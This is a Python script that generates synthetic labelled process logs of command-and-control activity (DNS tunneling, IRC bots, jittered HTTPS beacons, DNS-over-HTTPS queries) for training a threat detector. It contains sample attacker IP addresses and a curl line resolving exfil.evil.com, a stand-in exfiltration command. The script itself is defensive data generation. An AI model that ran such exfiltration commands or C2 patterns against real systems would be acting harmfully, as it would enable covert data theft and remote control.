#!/usr/bin/env python3
"""Round 6 — C2 variety: DNS tunneling, IRC, jittered HTTPS beacons."""

from __future__ import annotations

import argparse
import hashlib
import json
import random
from pathlib import Path

TS_MIN, TS_MAX = 1749000000, 1781300000
EVIL = ["185.220.101.45", "45.137.21.9", "91.92.109.43"]


def fmt(name, pid, uid, exe, cmd, ts, conns=None, files=None, kids=None):
    base = f"{name} PID:{pid} uid:{uid} exe:{exe} cmd:{cmd} time:{ts}"
    if conns:
        base += f" outbound_connections:[{','.join(sorted(conns))}]"
    if files:
        base += f" sensitive_files:[{','.join(sorted(files))}]"
    if kids:
        base += f" spawned_children:[{','.join(sorted(kids))}]"
    if not (conns or files or kids):
        base += " behavior:none_observed"
    return base


def evil_conn(port):
    return f"{random.choice(EVIL)}:{port}"


TEMPLATES = [
    dict(category="c2_dns", mitre=["T1071.004", "T1572"],
         name="python3", exe="/tmp/.dns", uid=1000,
         cmd="-c 'dns.exfil...'", conns=lambda: [evil_conn(53)],
         reasoning="DNS tunneling to suspicious resolver — C2 over DNS."),
    dict(category="c2_irc", mitre=["T1071", "T1102"],
         name=".irc", exe="/dev/shm/.irc", uid=1000,
         cmd="", conns=lambda: [evil_conn(6667)],
         reasoning="IRC bot connecting to classic C2 port 6667."),
    dict(category="c2_https_beacon", mitre=["T1071.001", "T1573"],
         name=".beacon", exe="/tmp/.beacon", uid=1000,
         cmd="--jitter 300", conns=lambda: [evil_conn(443)],
         reasoning="Jittered HTTPS beacon to unknown host."),
    dict(category="c2_doh", mitre=["T1071.004"],
         name="curl", exe="/usr/bin/curl", uid=1000,
         cmd="https://dns.google/resolve?name=exfil.evil.com",
         conns=lambda: [evil_conn(443)],
         reasoning="DNS-over-HTTPS exfil query pattern."),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--count", type=int, default=400)
    ap.add_argument("--out", default="data/bucket_h_c2_variety.jsonl")
    ap.add_argument("--seed", type=int, default=64)
    args = ap.parse_args()
    random.seed(args.seed)
    out = Path(args.out)
    seen, n = set(), 0
    with out.open("w") as f:
        while n < args.count:
            t = random.choice(TEMPLATES)
            conns = t["conns"]() if callable(t.get("conns")) else t.get("conns")
            rec = {
                "bucket": "threat",
                "category": t["category"],
                "mitre": t["mitre"],
                "tags": ["c2_variety", "round6"],
                "input": fmt(t["name"], random.randint(1000, 99999), t["uid"], t["exe"],
                             t["cmd"], random.randint(TS_MIN, TS_MAX),
                             conns, t.get("files"), t.get("kids")),
                "output": "QUARANTINE",
                "reasoning": t["reasoning"],
            }
            h = hashlib.sha1(rec["input"].encode()).hexdigest()
            if h in seen:
                continue
            seen.add(h)
            f.write(json.dumps(rec) + "\n")
            n += 1
    print(f"[+] {n} c2-variety records -> {out}")


if __name__ == "__main__":
    main()
